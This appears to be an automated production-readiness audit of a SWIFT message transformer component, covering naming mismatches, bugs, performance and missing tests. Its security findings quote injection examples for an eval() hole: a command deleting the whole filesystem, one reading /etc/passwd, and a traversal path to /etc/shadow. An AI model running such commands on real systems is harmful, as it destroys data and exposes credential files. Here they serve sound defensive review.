# Audit Report: SwiftTransformer (Custom Component)

> **Audited**: 2026-03-21
> **Auditor**: Claude Opus 4.6 (automated)
> **Engine Version**: v1
> **Converter**: `complex_converter` (generic `parse_base_component()` only)
> **Status**: PRODUCTION READINESS REVIEW

---

## 1. Component Identity

| Field | Value |
|-------|-------|
| **Custom Name** | `SwiftTransformer` / `TSwiftDataTransformer` |
| **V1 Engine Class** | `SwiftTransformer` |
| **Engine File** | `src/v1/engine/components/transform/swift_transformer.py` (878 lines) |
| **Converter Parser** | `src/converters/complex_converter/component_parser.py` -> type mapping only (line 72: `'tSwiftDataTransformer': 'TSwiftDataTransformer'`). NO dedicated `parse_*` method; falls through to generic `parse_base_component()`. |
| **Converter Dispatch** | `src/converters/complex_converter/converter.py` -> NO dedicated `elif` branch for `tSwiftDataTransformer`; uses generic `parse_base_component()` path. |
| **Registry Aliases** | `SwiftTransformer`, `tSwiftTransformer` (registered in `src/v1/engine/engine.py` lines 146-147) |
| **Category** | Transform / Custom (SWIFT Financial Messaging) |

### Key Files

| File | Purpose |
|------|---------|
| `src/v1/engine/components/transform/swift_transformer.py` | Engine implementation (878 lines) |
| `src/converters/complex_converter/component_parser.py` (line 72) | Type name mapping only (`tSwiftDataTransformer` -> `TSwiftDataTransformer`) |
| `src/converters/complex_converter/converter.py` | Dispatch -- no dedicated branch; uses generic `parse_base_component()` |
| `src/v1/engine/base_component.py` | Base class: `_update_stats()`, `_update_global_map()`, `validate_schema()`, `execute()` |
| `src/v1/engine/global_map.py` | GlobalMap storage for `{id}_NB_LINE` etc. |
| `src/v1/engine/exceptions.py` | Custom exception hierarchy (`ConfigurationError`, `DataValidationError`) |
| `src/v1/engine/components/transform/__init__.py` | Package exports (line 25: `from .swift_transformer import SwiftTransformer`) |

### Naming Discrepancy

The converter type mapping maps `tSwiftDataTransformer` to `TSwiftDataTransformer`, but the engine registers `SwiftTransformer` and `tSwiftTransformer`. There is NO `TSwiftDataTransformer` alias in the engine registry. If a converter-generated JSON config specifies `component_type: 'TSwiftDataTransformer'`, the engine will fail to find the component class. This is a critical wiring gap.

---

## 2. Scorecard

| Dimension | Score | P0 | P1 | P2 | P3 | Details |
|-----------|-------|----|----|----|----|---------|
| Converter Coverage | **R** | 1 | 1 | 0 | 0 | Type name mismatch between converter output and engine registry; no dedicated parser; no config extraction |
| Engine Feature Quality | **Y** | 1 | 4 | 5 | 2 | Duplicate method definition; eval() security hole; regex wildcard detection fragile; NaN/empty edge cases |
| Code Quality | **Y** | 2 | 4 | 6 | 3 | Duplicate `_load_lookup_files`; cross-cutting base class bugs; dict iteration order dependency; missing validation; wildcard-to-regex escaping gap; computed-field reference gap; config format fallthrough |
| Performance & Memory | **Y** | 0 | 1 | 2 | 1 | Row-by-row iterrows() processing; regex lookup O(n) per row; no vectorization |
| Testing | **R** | 1 | 0 | 0 | 0 | Zero unit tests; zero integration tests for this component |

**Overall: RED/YELLOW -- Not production-ready without P0/P1 fixes**

### Score Key
- **R** (Red): Critical gaps blocking production use
- **Y** (Yellow): Significant gaps; usable for subset of jobs with known limitations
- **G** (Green): Production-ready with minor improvements recommended

---

## 3. Component Purpose and Design

### What SwiftTransformer Does

`SwiftTransformer` is a **custom component** with no standard Talend equivalent. It transforms SWIFT (Society for Worldwide Interbank Financial Telecommunication) pipe-delimited message data from a raw parsed format into a business-friendly output format. It is designed to sit downstream of `SwiftBlockFormatter`, which parses raw SWIFT MT messages (e.g., MT940 bank statements) into a flat pipe-delimited DataFrame.

**Input**: A DataFrame with SWIFT message fields (e.g., `messagetype`, `block1bic`, `block2bic`, `block4_20`, `block4_25`, `block4_61`, `block4_86`).

**Output**: A DataFrame with business-meaningful fields (e.g., `SIDE`, `TERMID`, `DESTID`, `OURREF`, `THEIRREF`, `AMOUNT`, `CURRENCY`, `VALUEDATE`).

**Core Capabilities**:

1. **Configuration-driven field mapping**: Reads transformation rules from external YAML/JSON config files, inline config, or a hardcoded default config. Each output field is defined by a mapping type.

2. **Six field mapping types**:
   - `constant` -- Static value (e.g., `SIDE = "RECV"`)
   - `direct` -- Copy from input field to output field (e.g., `TERMID = sender_bic`)
   - `parsed` -- Extract substrings from input fields using regex, position, or split
   - `calculated` -- Derive values via concatenation, conditionals, or date extraction
   - `transformation` -- Domain-specific transforms (balance_parse, movement_parse, lookup, format)
   - `python_expression` -- Arbitrary Python expressions evaluated via `eval()` with access to input and computed fields

3. **Lookup table support**: Loads external CSV/pipe-delimited lookup files. Supports normal (exact) and regex/wildcard matching. Two-tier lookup dependency system (`depends_on_lookup` flag) for cascading lookups.

4. **Post-processing**: Truncation, padding, and string replacement on individual field values.

5. **Multi-pass computation**: Fields are computed in declaration order (allowing later fields to reference earlier computed fields). Three-pass execution: (1) compute all fields, (2) apply first-tier lookups, re-compute dependent fields, (3) apply second-tier lookups, re-compute dependent fields again.

6. **Output file writing**: Optionally writes the transformed DataFrame to a file (CSV/pipe-delimited) in addition to returning it.

### 3.1 Configuration Structure

The component accepts configuration in three ways (in priority order):

| Priority | Source | Config Key | Description |
|----------|--------|-----------|-------------|
| 1 | External file | `config_file` | Path to YAML/JSON file. Supports `${context.var}` resolution. Loaded at execution time. |
| 2 | Inline config | `transform_config` | Embedded config dict in the component's config block |
| 3 | Default config | (hardcoded) | `_get_default_transform_config()` -- SWIFT MT940-specific defaults |

**Config Sections**:

| Section | Type | Description |
|---------|------|-------------|
| `input_fields` | List[str] | Names of expected input columns (informational only -- not enforced) |
| `output_fields` | List[Dict] | Output field definitions with name, type, source, default, transform_config, etc. |
| `output_layout` | List[str] | Ordered list of field names for the output DataFrame columns. Fields in `output_fields` but not in `output_layout` are intermediate (computed but not output). |
| `field_mappings` | Dict | (Declared but never used in the code) |
| `transformations` | Dict | (Declared but never used in the code) |
| `lookups` | List[Dict] | Lookup table configurations with name, file, main_key, lookup_key, columns, match_type |

### 3.2 Output Field Definition Schema

Each entry in `output_fields` supports these attributes:

| Attribute | Type | Required | Description |
|-----------|------|----------|-------------|
| `name` | str | Yes | Output field name |
| `type` | str | No (default: `direct`) | Mapping type: `constant`, `direct`, `parsed`, `calculated`, `transformation`, `python_expression`, `placeholder` |
| `source` | str | No | Input column name to read from |
| `default` | str | No (default: `''`) | Default value when source is missing or transformation fails |
| `value` | str | No | Value for `constant` type fields |
| `parse_config` | Dict | No | Config for `parsed` type: `regex` (with `group`), `position` (start/end), `split` (delimiter/index) |
| `calc_config` | Dict | No | Config for `calculated` type: `concatenate`, `conditional`, `date_extraction` |
| `transform_config` | Dict | No | Config for `transformation` type: `balance_parse`, `movement_parse`, `lookup`, `format` |
| `python_expression` | str | No | Python expression string for `python_expression` type |
| `post_process` | Dict | No | Post-processing: `truncate`, `pad`, `replace` |
| `depends_on_lookup` | bool | No | If true, field is recomputed after lookups |

### 3.3 Lookup Configuration Schema

Each entry in `lookups` supports:

| Attribute | Type | Required | Description |
|-----------|------|----------|-------------|
| `name` | str | Yes | Lookup identifier |
| `file` | str | Yes | Path to lookup file. Supports `${context.var}`. |
| `main_key` | str | Yes | Output field name to match against |
| `lookup_key` | str | Yes | Column name in lookup file to match |
| `columns` | List[str] | Yes | Target output field names to populate from matched row |
| `source_columns` | List[str] | No | Source columns in lookup file (defaults to all non-key columns) |
| `match_type` | str | No (default: `normal`) | `normal` (exact) or `regex` (wildcard/regex pattern) |
| `depends_on_lookup` | bool | No | If true, this lookup runs in second tier (after first-tier lookups and field recomputation) |

### 3.4 Connection Types

| Connector | Direction | Type | Description |
|-----------|-----------|------|-------------|
| `FLOW` (Main) | Input | Row > Main | Input DataFrame from upstream component (e.g., SwiftBlockFormatter) |
| `FLOW` (Main) | Output | Row > Main | Transformed DataFrame with business fields per `output_layout` |
| `SUBJOB_OK` | Output (Trigger) | Trigger | Via base class -- fires on successful completion |
| `SUBJOB_ERROR` | Output (Trigger) | Trigger | Via base class -- fires on error |

### 3.5 GlobalMap Variables

| Variable | Set By | Description |
|----------|--------|-------------|
| `{id}_NB_LINE` | `_update_stats()` via base class | Total input rows processed |
| `{id}_NB_LINE_OK` | `_update_stats()` via base class | Successfully transformed rows |
| `{id}_NB_LINE_REJECT` | `_update_stats()` via base class | Always 0 (no reject mechanism) |

---

## 4. Converter Audit

### 4.1 Type Name Mapping

The converter maps `tSwiftDataTransformer` to `TSwiftDataTransformer` (component_parser.py line 72), but the engine registers `SwiftTransformer` and `tSwiftTransformer` (engine.py lines 146-147). There is NO `TSwiftDataTransformer` entry in the engine's component registry.

| Converter Output | Engine Registry | Match? |
|------------------|-----------------|--------|
| `TSwiftDataTransformer` | `SwiftTransformer` | **NO** |
| `TSwiftDataTransformer` | `tSwiftTransformer` | **NO** |

### 4.2 Parameter Extraction

There is NO dedicated parser method for `tSwiftDataTransformer`. The converter falls through to `parse_base_component()`, which extracts generic attributes (component ID, connections, schema) but does NOT extract any SwiftTransformer-specific parameters such as:

- `config_file` -- path to external YAML/JSON config
- `transform_config` -- inline transformation config
- `output_file` -- output file path
- `delimiter` -- output delimiter
- `output_encoding` -- output file encoding
- `include_header` -- whether to include header in output
- `die_on_error` -- error handling behavior
- `skip_error_rows` -- whether to skip rows that fail transformation

Since this is a custom component, the configuration is typically provided directly in the job JSON rather than extracted from Talend XML. However, the type name mismatch means even manually configured jobs will fail.

### 4.3 Converter Issues

| ID | Priority | Issue |
|----|----------|-------|
| CONV-ST-001 | **P0** | **Type name mismatch**: Converter outputs `TSwiftDataTransformer` (component_parser.py line 72) but engine registers `SwiftTransformer` and `tSwiftTransformer` (engine.py lines 146-147). Converted jobs will fail with `Unknown component type: TSwiftDataTransformer`. Either add `TSwiftDataTransformer` alias to engine registry or change converter mapping to `SwiftTransformer`. |
| CONV-ST-002 | **P1** | **No dedicated parser method**: Uses generic `parse_base_component()`. No SwiftTransformer-specific parameters are extracted from Talend XML. While custom components may be configured manually, any Talend jobs using `tSwiftDataTransformer` with XML parameters will lose all config. |

---

## 5. Engine Feature Quality

### 5.1 Feature Implementation Status

| # | Feature | Implemented? | Quality | Engine Location | Notes |
|----|---------|-------------|---------|-----------------|-------|
| 1 | External config loading (YAML/JSON) | **Yes** | High | `_load_external_config()` line 258 | Context variable resolution in path. Supports `.yaml`, `.yml`, `.json`. |
| 2 | Inline config | **Yes** | High | `_init_transformer_config()` line 52 | Fallback when no external config file |
| 3 | Default config | **Yes** | Medium | `_get_default_transform_config()` line 280 | Hardcoded MT940 defaults. Only useful for specific SWIFT message type. |
| 4 | Deferred config loading | **Yes** | High | `_ensure_config_loaded()` line 93 | Config loaded at execution time when context variables are available |
| 5 | Constant field mapping | **Yes** | High | `_get_field_value()` line 499 | Straightforward `output_field.get('value', default_value)` |
| 6 | Direct field mapping | **Yes** | High | `_get_field_value()` line 489 | With NaN/nan string guards |
| 7 | Parsed field mapping | **Yes** | High | `_parse_field_value()` line 547 | Regex, position, split extraction |
| 8 | Calculated field mapping | **Yes** | Medium | `_calculate_field_value()` line 582 | Concatenate, conditional, date_extraction |
| 9 | Transformation field mapping | **Yes** | Medium | `_apply_field_transformation()` line 729 | balance_parse, movement_parse, lookup, format |
| 10 | Python expression mapping | **Yes** | **Low** | `_evaluate_python_expression()` line 618 | Uses `eval()` with `__import__` exposed -- **security risk** |
| 11 | Placeholder field type | **Yes** | High | `_get_field_value()` line 526 | Returns default value. Stub for future. |
| 12 | Lookup loading (CSV/pipe) | **Yes** | Medium | `_load_lookup_files()` lines 125-170 | Auto-detects delimiter by extension. `keep_default_na=False` correctly prevents NA parsing. |
| 13 | Normal (exact) lookup matching | **Yes** | High | `_apply_lookups()` line 230 | Vectorized pandas boolean index |
| 14 | Regex/wildcard lookup matching | **Yes** | Medium | `_apply_lookups()` line 205 | Wildcard-to-regex conversion with heuristic detection. Row-by-row iteration. |
| 15 | Two-tier lookup dependency | **Yes** | Medium | `_transform_rows()` lines 427-441 | `depends_on_lookup` flag separates first/second tier |
| 16 | Intermediate computed fields | **Yes** | High | `_transform_rows()` lines 409-424 | `working_row` accumulates values; later fields reference earlier ones |
| 17 | Post-processing (truncate/pad/replace) | **Yes** | Medium | `_post_process_value()` line 825 | Pad direction logic is inverted (see BUG-ST-003) |
| 18 | Output file writing | **Yes** | High | `_write_output_file()` line 850 | NaN/nan/None cleanup before writing. Creates output directory. |
| 19 | SWIFT balance parsing | **Yes** | Medium | `_parse_balance_field()` line 758 | C/D + YYMMDD + Currency + Amount. Only handles comma decimal. |
| 20 | SWIFT movement parsing | **Yes** | Medium | `_parse_movement_field()` line 788 | MT940 field 61. Regex may not cover all variants. |
| 21 | Date component extraction | **Yes** | Medium | `_extract_date_component()` line 692 | Multiple format attempts. Ambiguous `%d%m%y` vs `%y%m%d` ordering. |
| 22 | Error row handling | **Partial** | Low | `_transform_rows()` line 461 | `skip_error_rows` config or empty row insertion. No REJECT flow. |
| 23 | Die on error | **Yes** | High | `_process()` line 395 | Raises RuntimeError or logs and returns empty DF |
| 24 | Context variable resolution | **Yes** | High | Via `BaseComponent.execute()` and `_load_external_config()` | `context_manager.resolve_string()` used for paths |

### 5.2 Behavioral Issues

| ID | Priority | Description |
|----|----------|-------------|
| ENG-ST-001 | **P0** | **Duplicate `_load_lookup_files()` method definition**: The method is defined TWICE in the file -- lines 125-133 (incomplete stub that does nothing useful after the `continue` on line 133) and lines 135-170 (full implementation). In Python, the second definition silently overrides the first, so the correct implementation is used. However, this is a clear code quality defect indicating incomplete editing/merging. The dead first definition is confusing and the 9-line stub wastes reader attention. |
| ENG-ST-002 | **P1** | **`eval()` with `__import__` exposed**: `_evaluate_python_expression()` (line 661) sets `'__import__': __import__` in `__builtins__`, allowing arbitrary module imports via YAML/JSON config. A malicious or corrupted config file can execute `__import__('os').system('rm -rf /')` or `__import__('subprocess').call(...)`. Even without `__import__`, the exposed builtins include `str`, `int`, etc. but also enable attribute access on objects in `eval_context` (e.g., `input_row.__class__.__mro__`). Should remove `__import__` at minimum, and consider using `ast.literal_eval()` or a restricted expression parser for production. |
| ENG-ST-003 | **P1** | **`output_fields_map` relies on dict insertion order**: `self.output_fields_map = {field['name']: field for field in self.output_fields}` (line 67/114) creates a dict from a list. In `_transform_rows()` (line 420), `for field_name, output_field in self.output_fields_map.items()` iterates this dict to compute fields in order. While Python 3.7+ guarantees dict insertion order, the DESIGN depends on this for correct intermediate field referencing. A field referencing an earlier computed field will fail if iteration order changes. This is not a bug per se in Python 3.7+, but the reliance is undocumented and fragile -- an `OrderedDict` or simply iterating the original `self.output_fields` list would make the intent explicit. |
| ENG-ST-004 | **P1** | **`field_mappings` and `transformations` config sections declared but never used**: `_init_transformer_config()` (lines 63-64, 110-111) extracts `self.field_mappings` and `self.transformations` from config but no code ever reads them. This is dead config. If a user provides `field_mappings` in their YAML, those mappings are silently ignored. This is misleading. |
| ENG-ST-005 | **P1** | **No input field validation**: The `input_fields` config section is loaded (line 60/107) but never used for validation. If the input DataFrame is missing expected columns referenced by `source` in output field definitions, the error is only caught at the per-field level in `_get_field_value()` where it silently returns the default value. There is no upfront check that input columns match `input_fields`, no warning that expected columns are missing. |
| ENG-ST-006 | **P2** | **`_parse_movement_field()` regex may not cover all MT940 field 61 variants**: The pattern `r'^(\d{6})(\d{4})?([DC])(\d+[.,]?\d*)([A-Z]?)([^/]*)?(//(.*))?'` does not handle: (a) `RC` / `RD` (reversal credit/debit) indicators, (b) amounts with multiple commas (European format `1.234.567,89`), (c) `EC` / `ED` (expected credit/debit). SWIFT MT940 spec allows `[D/C/RC/RD/EC/ED]` for the debit/credit mark. |
| ENG-ST-007 | **P2** | **`_parse_balance_field()` does not handle European number format**: Pattern `r'^([CD])(\d{6})([A-Z]{3})([\d,\.]+)'` and `amount = match.group(4).replace(',', '')` assumes comma is the only non-digit. European format with period as thousands separator (e.g., `1.234.567,89`) would produce incorrect amount `1234567.89` vs correct `1234567,89` -> `1234567.89`. The replace only strips commas, not periods. |
| ENG-ST-008 | **P2** | **Regex wildcard detection heuristic is brittle**: In `_apply_lookups()` line 214, the code checks `if ('*' in pattern or '?' in pattern) and not any(c in pattern for c in ['.', '^', '$', '+', '[', ']', '(', ')', '{', '}', '|', '\\'])` to distinguish wildcards from regex. A pattern like `FOO*BAR.TXT` (containing both `*` and `.`) would be treated as a "real regex" and NOT get wildcard-to-regex conversion, causing it to match incorrectly. The heuristic should check if the pattern is a simple glob rather than checking for ANY regex metacharacter. |
| ENG-ST-009 | **P2** | **`_extract_date_component()` has ambiguous format priority**: The format list `['%Y%m%d', '%d%m%y', '%y%m%d', '%Y-%m-%d', '%d-%m-%Y']` tries `%d%m%y` before `%y%m%d`. For a 6-digit date like `230115`, this would match `%d%m%y` as day=23, month=01, year=2015, but the SWIFT standard uses `%y%m%d` (year=23, month=01, day=15). SWIFT dates should try `%y%m%d` first. |
| ENG-ST-010 | **P2** | **Lookup column index mapping is fragile**: In `_apply_lookups()` lines 247-251, `for i, target_col in enumerate(columns)` paired with `source_col = source_columns[i]` relies on positional alignment between `columns` (target names) and `source_columns` (source names). If `source_columns` has fewer entries than `columns`, the inner `if i < len(source_columns)` guard prevents IndexError, but silently drops target columns. No warning is logged. |
| ENG-ST-011 | **P2** | **`_write_output_file()` does not resolve context variables in output path**: The `output_file` path from `self.config.get('output_file')` is used directly (line 383) without `context_manager.resolve_string()`. If the output path contains `${context.var}`, it will not be resolved. (Note: `BaseComponent.execute()` calls `context_manager.resolve_dict()` on the entire config, which should resolve this. But if `_write_output_file` is called before `execute()` resolves config, or if the path is in a nested structure not reached by `resolve_dict()`, this could fail.) |
| ENG-ST-012 | **P3** | **Third-pass recomputation is always unconditional**: In `_transform_rows()` lines 444-448, the third pass recomputes ALL `depends_on_lookup` fields again, even if no second-tier lookups matched or changed any values. This is wasted computation for fields whose inputs did not change. |
| ENG-ST-013 | **P3** | **No REJECT flow**: Like most v1 components, there is no mechanism to route failed rows to a reject output. Failed rows either produce empty output rows or are skipped (based on `skip_error_rows`). Error details are only logged, not captured in a structured way. |

### 5.3 GlobalMap Variable Coverage

| Variable | Set? | How Set | Notes |
|----------|------|---------|-------|
| `{id}_NB_LINE` | **Yes** | `_update_stats()` via base class | Set correctly |
| `{id}_NB_LINE_OK` | **Yes** | `_update_stats()` via base class | Always equals `NB_LINE` since no reject mechanism |
| `{id}_NB_LINE_REJECT` | **Partial** | `_update_stats()` via base class | Always 0. Even when rows fail and `skip_error_rows=true`, the reject count is not updated. |
| `{id}_ERROR_MESSAGE` | **No** | -- | Not implemented |

---

## 6. Code Quality

### 6.1 Bugs

| ID | Priority | Location | Description |
|----|----------|----------|-------------|
| BUG-ST-001 | **P0** | `src/v1/engine/base_component.py:304` | **`_update_global_map()` references undefined variable `value`**: The log statement on line 304 uses `{stat_name}: {value}` but the variable in the for loop (line 301) is named `stat_value`, not `value`. This causes `NameError` at runtime whenever `global_map` is not None. **CROSS-CUTTING**: This bug affects ALL components, not just SwiftTransformer, since `_update_global_map()` is called after every component execution (via `execute()` line 218). The `_update_global_map()` call is also in the exception handler (line 231), meaning a component error will trigger a SECOND error from this bug, masking the original. |
| BUG-ST-002 | **P0** | `src/v1/engine/global_map.py:28` | **`GlobalMap.get()` references undefined `default` parameter**: The method signature is `def get(self, key: str) -> Optional[Any]` (line 26), but the body calls `self._map.get(key, default)` (line 28). The `default` parameter is not in the signature, causing `NameError` on every `.get()` call. Additionally, `get_component_stat()` on line 58 calls `self.get(key, default)` with two arguments, but `get()` only accepts one. **CROSS-CUTTING**: Affects all code using `global_map.get()`. |
| BUG-ST-003 | **P2** | `swift_transformer.py:838-839` | **Post-processing pad direction is inverted**: For `side == 'left'`, the code calls `value.ljust(length, pad_char)` (left-justify = pad RIGHT side). For `side == 'right'`, it calls `value.rjust(length, pad_char)` (right-justify = pad LEFT side). The semantics are backwards: `side='left'` should pad the LEFT side (right-justify), and `side='right'` should pad the RIGHT side (left-justify). As written, `post_process: {type: pad, side: left}` actually pads the right side. |
| BUG-ST-004 | **P2** | `swift_transformer.py:125-133` | **Duplicate `_load_lookup_files()` definition**: The method is defined twice. Lines 125-133 contain an incomplete stub (only the `if not lookup_file: continue` path). Lines 135-170 contain the full implementation. Python uses the second definition, so functionality is correct, but the dead first definition is confusing and indicates an incomplete edit/merge. |
| BUG-ST-005 | **P2** | `swift_transformer.py:396-400` | **`die_on_error=false` path sets stats to (0, 0, 1) then returns empty DF**: When a top-level exception occurs in `_process()` with `die_on_error=false`, `_update_stats(0, 0, 1)` is called. This adds 1 to `NB_LINE_REJECT` but does NOT set `NB_LINE` to the actual number of input rows processed before the error. If the error occurs after partial processing, the stats are inaccurate. |
| BUG-ST-006 | **P1** | `swift_transformer.py:214-216` (`_apply_lookups`) | **Wildcard-to-regex conversion doesn't escape regex metacharacters**: `pattern.replace('*', '.*')` leaves `(`, `)`, `+`, `[`, etc. as live regex. `SWIFT(v1)*` becomes `^SWIFT(v1).*$` where `(v1)` is a capture group. Fix: `re.escape(pattern).replace(r'\\*', '.*').replace(r'\\?', '.')`. |
| BUG-ST-007 | **P2** | `swift_transformer.py:582-616` (`_calculate_field_value`, `_parse_field_value`) | **`calculated` and `parsed` mapping types read only from `input_row`, can't reference previously computed fields**: Only `python_expression` has access to `working_row`. Three-pass system doesn't help for non-expression types. A `calculated` field that needs to concatenate a previously computed output field has no mechanism to do so; it can only reference original input columns. |
| BUG-ST-008 | **P2** | `swift_transformer.py:258-278` (`_load_external_config`) | **`_load_external_config()` falls through to `json.load()` for any non-YAML extension**: `.conf`, `.txt`, `.properties`, etc. all hit the JSON parsing path. A `.conf` or `.txt` config file produces an unhelpful `json.JSONDecodeError` instead of a clear "unsupported config format" message. Should validate the extension and raise `ConfigurationError` for unrecognized formats. |
| BUG-ST-009 | **P2** | `swift_transformer.py:420-424` | **`output_fields_map.items()` iteration order determines computation correctness**: Fields are computed by iterating `self.output_fields_map` (a dict comprehension from `self.output_fields` list). If a field X references computed field Y via `python_expression`, Y must be computed before X. The correctness depends on dict insertion order matching the list order (guaranteed in Python 3.7+ but implicit). Should iterate `self.output_fields` list directly to make ordering explicit. |
| BUG-ST-010 | **P3** | `swift_transformer.py:801` | **`_parse_movement_field()` value_date fallback is wrong**: When the optional `MMDD` group (group 2) is absent, the code falls back `value_date = entry_date`. But `entry_date` is `YYMMDD` (6 digits) while `value_date` should be `MMDD` (4 digits). The semantics are different -- entry_date is a full date, value_date in MT940 is the month/day portion only. Returning the 6-digit entry_date as value_date may cause downstream date parsing failures. |

### 6.2 Naming Consistency

| ID | Priority | Issue |
|----|----------|-------|
| NAME-ST-001 | **P2** | **Converter maps to `TSwiftDataTransformer` but engine registers `SwiftTransformer` / `tSwiftTransformer`**: The `T` prefix and `DataTransformer` suffix from the converter do not match the engine alias. Either the converter should map to `SwiftTransformer` or the engine should add a `TSwiftDataTransformer` alias. |
| NAME-ST-002 | **P3** | **Class docstring says "TSwiftDataTransformer"** (line 2) but the class is named `SwiftTransformer` (line 22). The docstring references a different name than the actual class. |
| NAME-ST-003 | **P3** | **`field_mappings` and `transformations` config keys are misleading**: These are extracted from config but never used. The actual mapping logic uses `output_fields` and `output_fields_map`. The dead config keys create confusion for users writing YAML config files. |

### 6.3 Standards Compliance

| ID | Priority | Standard | Violation |
|----|----------|----------|-----------|
| STD-ST-001 | **P1** | "Every component MUST have its own `parse_*` method" | No dedicated parser method for `tSwiftDataTransformer` in `component_parser.py`. Uses generic `parse_base_component()`. |
| STD-ST-002 | **P2** | "No dead code" | Duplicate `_load_lookup_files()` (lines 125-133). Dead `field_mappings` and `transformations` config. |
| STD-ST-003 | **P3** | "No `print()` statements" | No print statements found -- compliant. |

### 6.4 Security

| ID | Priority | Issue |
|----|----------|-------|
| SEC-ST-001 | **P1** | **`eval()` with `__import__` in `__builtins__`**: `_evaluate_python_expression()` (line 661) exposes `__import__` in the eval context's `__builtins__` dict. This allows arbitrary code execution via config-supplied expressions: `__import__('os').system('cat /etc/passwd')`. The YAML/JSON config file becomes a code injection vector. Even if configs are "trusted", defense-in-depth requires removing `__import__`. The `re` module is also exposed, allowing `re.sub()` with replacement functions for additional attack surface. |
| SEC-ST-002 | **P2** | **No path traversal protection on config_file or lookup paths**: `_load_external_config()` and `_load_lookup_files()` accept paths from config that could traverse directories (e.g., `../../etc/shadow`). Combined with the `eval()` exposure, a malicious config file has both path traversal and arbitrary code execution capabilities. |

### 6.5 Logging Quality

| Aspect | Assessment |
|--------|------------|
| Logger setup | Module-level `logger = logging.getLogger(__name__)` -- correct |
| Component ID prefix | All log messages use `f"Component {self.id}:"` prefix -- correct |
| Level usage | INFO for milestones, DEBUG for details, WARNING for recoverable issues, ERROR for failures -- correct |
| Start/complete logging | `_process()` logs input row count (line 376) and output row count (line 389) -- correct |
| Sensitive data | Financial data (amounts, BICs, references) may be logged in error messages at WARNING level. Low risk for production logging but worth noting for compliance. |
| No print statements | No `print()` calls -- correct |

### 6.6 Error Handling Quality

| Aspect | Assessment |
|--------|------------|
| Custom exceptions | Uses `RuntimeError` and `ValueError` (lines 395, 104, 278). Does NOT use the custom exception hierarchy (`ConfigurationError`, `DataValidationError`) from `exceptions.py`. Should use `ConfigurationError` for config loading failures and `DataValidationError` for transformation errors. |
| Exception chaining | Does NOT use `raise ... from e` pattern. `raise ValueError(f"Failed to load transformation config: {str(e)}")` on line 278 loses the original traceback. |
| `die_on_error` handling | Single try/except in `_process()` (lines 393-400) handles this correctly. |
| No bare `except` | All except clauses specify `Exception` -- correct |
| Error messages | Include component ID and error details -- correct |
| Per-row error handling | `_transform_rows()` (lines 461-468) catches per-row exceptions. Either skips row (`skip_error_rows=true`) or inserts empty row. Correct degradation. |
| Per-field error handling | `_get_field_value()` (lines 543-545) catches per-field exceptions and returns default value with WARNING log. Correct graceful degradation. |

### 6.7 Type Hints

| Aspect | Assessment |
|--------|------------|
| Method signatures | All public/private methods have parameter type hints -- correct |
| Return types | `_process()` returns `Dict[str, Any]`. `_get_field_value()` returns `str`. All typed. |
| Complex types | Uses `Dict[str, Any]`, `Optional[pd.DataFrame]`, `Optional[List]` -- correct |
| Missing hint | `_load_lookup_files()` has no return type hint (returns None implicitly). Minor. |

---

## 7. Performance & Memory

| ID | Priority | Issue |
|----|----------|-------|
| PERF-ST-001 | **P1** | **Row-by-row `iterrows()` processing**: `_transform_rows()` (line 407) uses `for index, row in input_df.iterrows()` which is the slowest iteration method in pandas. For a DataFrame with 100K+ rows and 50+ output fields, this creates massive overhead. Each row produces a Python dict, each field triggers a Python function call. For a 100K-row input with 30 output fields, this is 3 million Python function calls minimum. Should consider vectorized operations for simple mapping types (`constant`, `direct`) and reserve row-by-row only for complex types (`python_expression`, `transformation`). |
| PERF-ST-002 | **P2** | **Regex lookup is O(N*M) per row**: For `match_type='regex'` lookups, `_apply_lookups()` iterates ALL rows of the lookup DataFrame (line 209: `for idx, row in lookup_df.iterrows()`) for EACH input row. For a 100K-row input with a 1K-row regex lookup, this is 100 million comparisons per lookup. Should pre-compile regex patterns and consider caching match results for repeated input values. |
| PERF-ST-003 | **P2** | **Three-pass field computation always runs**: Even when there are no second-tier lookups, the third pass (lines 444-448) still iterates all `depends_on_lookup` fields. Could skip pass 3 when no second-tier lookups exist. |
| PERF-ST-004 | **P3** | **`input_row.to_dict()` called for every python_expression field**: In `_evaluate_python_expression()` (line 637), `input_row.to_dict()` is called each time. If multiple fields use `python_expression`, the same row is converted to dict multiple times. Should convert once in `_transform_rows()` and pass the dict. |

### 7.1 Memory Management Assessment

| Aspect | Assessment |
|--------|------------|
| Streaming mode | Supported via `BaseComponent._execute_streaming()`. SwiftTransformer's `_process()` receives chunks and processes them. Correct. |
| Lookup tables in memory | All lookup files are loaded into memory as DataFrames during `_load_lookup_files()`. For large lookup files (100K+ rows), this could consume significant memory. No lazy loading or size limits. |
| Working row accumulation | Each row creates a `working_row` dict with ALL output fields (including intermediate ones not in `output_layout`). For configs with many intermediate fields, this dict grows per row but is garbage collected. Acceptable. |
| Config in memory | External YAML/JSON config is loaded once and stored as `self.transform_config`. Acceptable. |
| Output DataFrame | `pd.DataFrame(transformed_rows, columns=self.output_layout)` (line 471) creates the full output DataFrame in memory at once. For very large inputs, the `transformed_rows` list and the resulting DataFrame are both in memory simultaneously. Streaming mode mitigates this via chunking. |

### 7.2 Streaming Mode Limitations

| Issue | Description |
|-------|-------------|
| Lookup across chunks | Lookups reference external lookup tables (loaded once), not inter-row relationships in the input. So chunked processing does not affect lookup correctness. |
| Stats accumulation | `_update_stats()` is called once per `_process()` invocation (line 387). In streaming mode, this is called per chunk, which correctly accumulates totals. |
| Output file writing | When `output_file` is set and streaming is active, each chunk writes separately, potentially overwriting previous chunks. The `_write_output_file()` uses `to_csv()` which overwrites the file each time. **This is a bug in streaming mode**: only the last chunk's output will be in the file. Should use append mode for subsequent chunks. |

---

## 8. Testing

### 8.1 Current Coverage

| Test Type | Exists? | File | Notes |
|-----------|---------|------|-------|
| V1 engine unit tests | **No** | -- | Zero test files found for `SwiftTransformer` |
| V1 engine integration tests | **No** | -- | No v1 integration tests found |
| Converter tests | **No** | -- | No converter-specific tests for `tSwiftDataTransformer` |

**Key finding**: The v1 engine has ZERO tests for this 878-line component. All code is completely unverified by automated tests.

### 8.2 Recommended Test Cases

#### P0 -- Must Have Before Production

| # | Test Case | Priority | Description |
|----|-----------|----------|-------------|
| 1 | Basic transformation with default config | P0 | Provide a simple DataFrame with SWIFT fields, verify output has correct business fields with default MT940 config |
| 2 | External YAML config loading | P0 | Provide a YAML config file path, verify config is loaded and transformations applied correctly |
| 3 | Constant field mapping | P0 | Verify `type: constant` produces the configured static value for every row |
| 4 | Direct field mapping | P0 | Verify `type: direct` copies the source column value to the output field |
| 5 | Direct field mapping with NaN source | P0 | Verify NaN values in source column produce the default value, not `'nan'` string |
